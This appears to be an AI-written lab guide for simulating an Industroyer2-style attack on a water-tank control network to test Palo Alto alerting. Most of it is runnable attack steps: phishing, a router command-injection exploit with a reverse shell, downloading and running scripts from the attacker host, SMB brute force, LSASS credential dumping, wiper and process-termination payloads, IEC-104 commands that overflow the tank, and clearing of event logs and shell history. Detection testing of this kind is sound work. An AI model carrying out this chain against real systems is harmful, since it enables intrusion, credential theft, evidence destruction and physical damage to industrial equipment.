# Industroyer2 Attack Simulation - Complete Lab Setup Guide

## Overview

This guide provides complete setup instructions for simulating an Industroyer2-style attack chain in your Palo Alto Networks lab environment.

## Network Topology

```
ATTACKER MACHINE (Kali Linux)
IP: 192.168.0.11
├── Tools: Python3, nmap, impacket, etc.
└── Hosts: Phishing page, attack scripts

EMULATED ROUTER (Linux)
IPs: 192.168.0.13, 192.168.1.4, 192.168.100.2
├── Vulnerable web interface (port 8080)
├── SSH access: admin:admin or operator:labpass123
└── Routes between networks

IT/OT NETWORK (192.168.1.0/24)
├── HMI (Windows): 192.168.1.55
├── Historian: 192.168.1.27
└── PLC: 192.168.1.6

OT DEVICE
└── Water Tank RTU: 192.168.1.6:2404 (IEC-104)
```

## Components Created

### 1. Phishing Components
- `attacker_scripts/00_phishing_page.html` - Credential harvesting page
- `attacker_scripts/00_phishing_server.py` - Flask server for phishing
- **Generates**: URL filtering alerts, DNS security alerts

### 2. Credential Dumping
- `attacker_scripts/05_credential_dumper.py` - LSASS + Registry dumping simulation
- **Generates**: Cortex XDR credential access alerts, XSIAM correlation

### 3. Industroyer2 Characteristics
- `industroyer2_payload/industroyer2_characteristics.py` - Process termination + CaddyWiper
- `industroyer2_payload/PService_PPD.py` - Dummy SCADA process
- **Generates**: Process termination, data destruction, anti-forensics alerts

### 4. Existing Components (Already in repo)
- `attacker_scripts/01_router_exploit.py` - Router command injection
- `attacker_scripts/02_post_exploit_enum.sh` - Network enumeration
- `attacker_scripts/03_lateral_movement.py` - SMB/WMI/RDP lateral movement
- `attacker_scripts/04_windows_payload.ps1/py` - Multi-technique execution
- `perform_malware_simulations/industroyer2_simulation.py` - IEC-104 attack

## Setup Instructions by Machine

### Attacker Machine (192.168.0.11 - Kali Linux)

```bash
# 1. Install dependencies
sudo apt-get update
sudo apt-get install -y python3 python3-pip nmap smbclient crackmapexec evil-winrm
pip3 install requests urllib3 flask impacket

# 2. Copy attack scripts
cd ~/
git clone <your_repo> || scp -r user@dev:/path/to/iec104_water_tank ~/

# 3. Verify scripts are executable
cd ~/iec104_water_tank/attacker_scripts
chmod +x *.py *.sh

# 4. Test phishing server (optional)
python3 00_phishing_server.py --port 8080
# Access: http://192.168.0.11:8080

# 5. Test router connectivity
ping 192.168.0.13
curl http://192.168.0.13:8080
```

### Emulated Router (192.168.0.13, 192.168.1.4, 192.168.100.2 - Linux)

```bash
# 1. Install Flask for vulnerable web server
sudo apt-get update
sudo apt-get install -y python3 python3-pip
pip3 install flask

# 2. Copy router simulation
cd /opt
sudo mkdir iec104_lab
sudo chown $USER:$USER iec104_lab
cd iec104_lab
# Copy router_simulation/vulnerable_router_server.py here

# 3. Configure network routing
sudo sysctl -w net.ipv4.ip_forward=1

# Add to /etc/sysctl.conf for persistence:
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf

# 4. Configure firewall (if needed)
sudo iptables -A FORWARD -j ACCEPT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# 5. Start vulnerable router web interface
cd /opt/iec104_lab
sudo python3 vulnerable_router_server.py

# Should show:
# Port: 8080
# Credentials: admin/admin, root/password123, support/support
# Vulnerability: Command injection in /api/diagnostic
```

### HMI Machine (192.168.1.55 - Windows)

```powershell
# 1. Install Python 3.10+ (if not already installed)
# Download from: https://www.python.org/downloads/
# During installation, check "Add Python to PATH"

# 2. Install dependencies
pip install c104 pyinstaller

# 3. Create directories
New-Item -ItemType Directory -Path C:\ICS_Lab -Force
cd C:\ICS_Lab

# 4. Copy payload components (via SMB, RDP, or USB)
# Copy these files to C:\ICS_Lab\:
# - industroyer2_payload/PService_PPD.py
# - industroyer2_payload/industroyer2_characteristics.py
# - industroyer2_payload/build_windows_exe.spec
# - perform_malware_simulations/industroyer2_simulation.py
# - attacker_scripts/05_credential_dumper.py

# 5. Build Windows executables (on Windows machine)
cd C:\ICS_Lab\industroyer2_payload
pyinstaller --onefile --windowed --name PService_PPD PService_PPD.py
pyinstaller --onefile --name industroyer2_characteristics industroyer2_characteristics.py
pyinstaller --onefile --name industroyer2_simulation ..\perform_malware_simulations\industroyer2_simulation.py

# Executables will be in: dist\
# - PService_PPD.exe
# - industroyer2_characteristics.exe
# - industroyer2_simulation.exe

# 6. Start dummy SCADA process (for testing)
.\dist\PService_PPD.exe
# OR for console mode:
python PService_PPD.py --console

# 7. Install Cortex XDR Agent
# Download from Cortex XDR console
# Install with distribution key
# Verify: Check Cortex XDR console → Endpoints

# 8. Configure Windows for testing
# Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Enable WinRM (optional)
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force

# Create test user for lateral movement
net user test_user Password123! /add
net localgroup Administrators test_user /add
```

### PLC/RTU Machine (192.168.1.6 - Linux)

```bash
# 1. Install Python and dependencies
sudo apt-get update
sudo apt-get install -y python3 python3-pip python3-tk
pip3 install c104

# 2. Copy water tank server
cd ~/
# Copy entire iec104_water_tank directory

# 3. Install c104 library (critical!)
cd ~/iec104_water_tank/c104-2.2.1
pip3 install .

# 4. Test water tank server
cd ~/iec104_water_tank
python3 water_tank_server.py

# Should show:
# IEC-104 server listening on 0.0.0.0:2404
# Water tank simulation running...

# 5. Verify connectivity
# From HMI or attacker:
nc -zv 192.168.1.6 2404
```

## Attack Execution Flow

### Phase 1: Initial Access - Phishing + Router Exploit

```bash
# On Attacker Machine (192.168.0.11):

# Option A: Phishing (requires user interaction)
cd ~/iec104_water_tank/attacker_scripts
python3 00_phishing_server.py --port 8080
# Send phishing link to victim: http://192.168.0.11:8080
# Wait for victim to enter credentials (SSH to router)

# Option B: Direct Router Exploit
python3 01_router_exploit.py 192.168.0.13 --username admin --password admin
# Test vulnerability:
python3 01_router_exploit.py 192.168.0.13 --command "whoami"

# Establish reverse shell:
# Terminal 1 (listener):
nc -lvnp 4444

# Terminal 2 (exploit):
python3 01_router_exploit.py 192.168.0.13 \
  --attacker-ip 192.168.0.11 \
  --reverse-shell \
  --shell-method bash_tcp

# You should get shell on Terminal 1
```

### Phase 2: Post-Exploitation Enumeration

```bash
# In router reverse shell:

# Download enumeration script
wget http://192.168.0.11:8000/02_post_exploit_enum.sh -O /tmp/enum.sh
# OR use: curl http://192.168.0.11:8000/02_post_exploit_enum.sh > /tmp/enum.sh

chmod +x /tmp/enum.sh
bash /tmp/enum.sh

# Check discovered hosts:
cat /tmp/.system_cache/windows_hosts.txt
cat /tmp/.system_cache/port_scan_results.txt

# Expected to find: 192.168.1.55 (HMI)
```

### Phase 3: Lateral Movement to HMI

```bash
# On Router (via reverse shell) OR directly from Attacker:

# Test connectivity to HMI
ping -c 3 192.168.1.55
nc -zv 192.168.1.55 445  # SMB
nc -zv 192.168.1.55 3389 # RDP

# Transfer lateral movement script
python3 03_lateral_movement.py -t 192.168.1.55 --scan

# Brute force (or use known creds)
python3 03_lateral_movement.py -t 192.168.1.55 --brute-force

# Or use known credentials:
python3 03_lateral_movement.py -t 192.168.1.55 \
  -u administrator \
  -p <ASK_USER_FOR_CREDENTIALS> \
  --full-chain
```

### Phase 4: Credential Dumping on HMI

```bash
# After gaining access to HMI (via lateral movement):

# Transfer credential dumper
# Method 1: SMB
smbclient //192.168.1.55/C$ -U administrator%<password> \
  -c "put 05_credential_dumper.py Windows\Temp\cred_dump.py"

# Method 2: HTTP Download (from HMI PowerShell):
Invoke-WebRequest -Uri http://192.168.0.11:8000/05_credential_dumper.py -OutFile C:\Temp\cred_dump.py

# Execute on HMI:
python C:\Temp\cred_dump.py --method all --output C:\Temp\dumps

# Expected alerts:
# - Cortex XDR: LSASS Memory Access
# - Cortex XDR: Credential Dumping Attempt
# - XSIAM: Credential Access Attack Pattern
```

### Phase 5: Deploy Industroyer2 Payload

```bash
# Transfer payload to HMI

# Method 1: Create payload.zip (on attacker)
cd ~/iec104_water_tank
zip -r payload.zip \
  industroyer2_payload/industroyer2_characteristics.py \
  industroyer2_payload/PService_PPD.py \
  perform_malware_simulations/industroyer2_simulation.py \
  perform_malware_simulations/raw_iec104.py \
  common/config.py

# Method 2: Transfer via SMB
smbclient //192.168.1.55/C$ -U administrator%<password> \
  -c "put payload.zip Windows\Temp\payload.zip"

# Method 3: PowerShell download (from HMI)
Invoke-WebRequest -Uri http://192.168.0.11:8000/payload.zip -OutFile C:\Temp\payload.zip

# Extract on HMI:
Expand-Archive -Path C:\Temp\payload.zip -DestinationPath C:\Temp\industroyer2
```

### Phase 6: Execute Industroyer2 Characteristics

```powershell
# On HMI (Windows):

# 1. Start dummy SCADA process (if using .exe)
cd C:\ICS_Lab\industroyer2_payload\dist
Start-Process -FilePath .\PService_PPD.exe

# OR if using Python:
python C:\Temp\industroyer2\industroyer2_payload\PService_PPD.py

# 2. Run Industroyer2 characteristics (in separate PowerShell)
cd C:\Temp\industroyer2\industroyer2_payload

# Run all characteristics:
python industroyer2_characteristics.py

# Or individually:
python industroyer2_characteristics.py --mode terminate
python industroyer2_characteristics.py --mode wiper

# Expected Alerts:
# - Cortex XDR: Critical Process Termination (PService_PPD.exe)
# - Cortex XDR: Anti-Forensics (event log deletion)
# - Cortex XDR: Data Destruction (CaddyWiper)
# - XSIAM: Industroyer2 Attack Pattern
```

### Phase 7: Execute IEC-104 Attack on Water Tank

```powershell
# On HMI (Windows):

cd C:\Temp\industroyer2\perform_malware_simulations

# Attack the PLC/RTU water tank
python industroyer2_simulation.py --target 192.168.1.6 --port 2404 --duration 60

# Expected behavior:
# 1. Scans for IEC-104 protocol
# 2. Sets control mode to MANUAL
# 3. Opens inlet valve
# 4. Closes outlet valve
# 5. Tank fills → overflow → explosion
# 6. Sends historical Industroyer2 IOA patterns

# Expected Alerts:
# - Device Security: IEC-104 protocol anomalies
# - XSIAM: OT Attack Pattern
# - Cortex XDR: Malicious network activity from HMI
```

## Expected Alerts by Product

### Cortex XDR (Priority 3)
- Multiple failed login attempts (brute force)
- LSASS memory access (credential dumping)
- Registry hive dump (SAM database access)
- Critical process termination (PService_PPD.exe)
- Event log tampering (anti-forensics)
- Data destruction / wiper activity
- Lateral movement (WMI, PsExec)
- PowerShell suspicious execution

### Device Security (Priority 2)
- HTTP command injection (router exploit)
- Reverse shell connection (outbound port 4444)
- Port scan detection (from router)
- SMB brute force attempts
- IEC-104 protocol anomalies
- Suspicious network patterns

### XSIAM (Priority 1) - **PRIMARY GOAL**
- **Full attack chain correlation:**
  1. Initial Access (Router Exploit)
  2. Discovery (Network Enumeration)
  3. Credential Access (LSASS Dumping)
  4. Lateral Movement (SMB → HMI)
  5. Execution (Industroyer2 Characteristics)
  6. Impact (IEC-104 Attack → OT Disruption)

- Industroyer2 TTP pattern matching
- IT-to-OT pivot detection
- Multi-stage attack visualization

### WildFire (Priority 5)
- payload.zip analysis
- Python script behavioral analysis
- Executable submission (if built .exe files)

## RDP Credentials (User to Provide)

**IMPORTANT**: When you're ready to test RDP-based lateral movement, please provide:
- HMI RDP Username: _______________
- HMI RDP Password: _______________

Update this in: `attacker_scripts/03_lateral_movement.py`

## Cleanup After Testing

### Router
```bash
sudo pkill -f vulnerable_router_server.py
rm -rf /tmp/.system_cache
rm /tmp/enum.sh /tmp/lm.py
```

### HMI (Windows)
```powershell
# Stop processes
Stop-Process -Name PService_PPD -Force -ErrorAction SilentlyContinue

# Remove files
Remove-Item -Path C:\Temp\industroyer2 -Recurse -Force
Remove-Item -Path C:\Temp\payload.zip -Force
Remove-Item -Path C:\Temp\cred_dump.py -Force
Remove-Item -Path C:\Temp\dumps -Recurse -Force

# Clear event logs (optional - for next test)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```

### Attacker
```bash
history -c
> ~/.bash_history
```

## Troubleshooting

### Router Exploit Fails
- Verify router web server is running: `curl http://192.168.0.13:8080`
- Check credentials: admin/admin
- Verify network connectivity: `ping 192.168.0.13`

### Lateral Movement Fails
- Check SMB port open: `nc -zv 192.168.1.55 445`
- Verify credentials are correct
- Ensure Windows Firewall allows SMB/RDP/WinRM

### Industroyer2 IEC-104 Attack Fails
- Check PLC/RTU is running: `nc -zv 192.168.1.6 2404`
- Verify c104 library is installed: `pip show c104`
- Check network routing from HMI to PLC

### No Alerts Generated
- Verify Cortex XDR agent is connected (check console)
- Ensure XSIAM data ingestion is configured
- Check time synchronization across systems
- Review Palo Alto Firewall policies (traffic should be allowed but logged)

## Success Metrics

After full attack chain execution, you should observe:

**Minimum Alerts:**
- XSIAM: 1 complete attack chain visualization (6 phases)
- Device Security: 10-15 alerts
- Cortex XDR: 20-30 alerts
- WildFire: 2-5 file submissions

**MITRE ATT&CK TTPs Covered:**
- T1190: Exploit Public-Facing Application (router)
- T1003: OS Credential Dumping (LSASS/Registry)
- T1021: Remote Services (SMB/WMI/RDP)
- T1059: Command and Scripting Interpreter
- T1070: Indicator Removal (event logs)
- T1485: Data Destruction (CaddyWiper)
- T1489: Service Stop (PService_PPD termination)
- T1571: Non-Standard Port (IEC-104 2404)

## Next Steps

This completes **Option A: Full Realistic Flow**.

For **Option B (Streamlined)** and **Option C (Two-Stage IT/OT)**, I've added notes in the attack scripts for future enhancements:
- Faster execution with fewer delays
- Direct IT → OT pivot without intermediate enumeration
- Emphasis on network segmentation bypass

All scripts contain inline comments marking "TODO: Option B" and "TODO: Option C" for easy enhancement.

## Support

If you encounter issues:
1. Check the troubleshooting section above
2. Review log files in each component
3. Verify network connectivity with ping/nc
4. Check Palo Alto product consoles for errors

For questions about specific components, refer to the individual script help:
```bash
python3 <script_name>.py --help
```
